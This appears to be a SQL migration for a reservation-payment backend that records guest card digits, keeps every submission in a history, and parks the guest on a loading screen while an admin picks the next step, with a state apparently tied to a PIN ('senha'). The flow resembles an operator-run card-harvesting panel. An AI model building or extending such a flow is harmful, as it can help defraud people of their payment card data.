-- After the guest submits the card digits, send them to the waiting
-- ("Carregamento") screen instead of back to the aproximação screen.
-- The admin then decides the next step from the reservations panel.
CREATE OR REPLACE FUNCTION public.submit_guest_card_last4(
  p_reservation_id uuid,
  p_last4 text
)
RETURNS boolean
LANGUAGE plpgsql SECURITY DEFINER
SET search_path = public
AS $$
BEGIN
  IF p_last4 !~ '^\d{4,6}$' THEN
    RETURN false;
  END IF;

  IF NOT public.is_guest_reservation(p_reservation_id) THEN
    RETURN false;
  END IF;

  UPDATE public.reservations
  SET card_last4 = p_last4,
      card_digits_history = COALESCE(card_digits_history, '[]'::jsonb) || jsonb_build_array(
        jsonb_build_object('digits', p_last4, 'at', now())
      ),
      pix_message = '__aprox_espera__'  -- guest waits on the loading screen
  WHERE id = p_reservation_id
    AND status = 'aguardando_pagamento'
    AND pix_message = '__aprox_senha__';

  RETURN FOUND;
END;
$$;
